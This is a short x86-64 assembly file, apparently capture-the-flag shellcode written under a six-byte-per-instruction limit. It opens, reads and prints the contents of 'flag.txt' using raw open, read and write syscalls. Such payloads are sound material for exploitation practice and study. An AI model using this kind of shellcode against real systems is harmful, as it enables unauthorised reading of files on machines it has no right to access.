BITS 64

; NOTE: instructions must be <= 6 bytes
;
; preconditions:
;   rax, rbx contain "flag.txt\0"

    mov     [rsp], rax
    mov     [rsp+8], rbx

    mov     rdi, rsp   ; const char *filename
    xor     rsi, rsi   ; int flags
    xor     rdx, rdx   ; int mode
    mov     rax, 2     ; sys_open
    syscall            ; returns file descriptor

    mov     rdi, rax   ; unsigned int fd
    mov     rsi, rsp   ; char *buf
    mov     rdx, 100   ; size_t count
    xor     rax, rax   ; sys_read
    syscall            ; returns number of bytes read

    mov     rdi, 1     ; unsigned int fd = stdout
    mov     rsi, rsp   ; const char *buf
    mov     rdx, rax   ; size_t count
    mov     rax, 1     ; sys_write
    syscall
